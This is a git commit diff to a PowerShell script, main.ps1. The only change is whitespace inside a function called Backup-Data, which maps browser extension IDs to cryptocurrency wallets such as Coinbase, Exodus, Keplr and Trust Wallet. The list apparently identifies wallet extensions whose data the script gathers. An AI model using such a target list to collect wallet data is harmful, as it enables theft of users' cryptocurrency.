5892e3f9786c9a759cd54f7222e88ba9738fad67
CHA1NSK1 <96607632+Chainski@users.noreply.github.com>
2024-06-13 08:48:27 -0500

    Add files via upload

--- frontend-src/main.ps1
+++ frontend-src/main.ps1
@@ -807,7 +807,7 @@ function Backup-Data {
     	"odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
     	"aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
     	"hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
-		"dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
+        "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
         "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
         "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
         "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
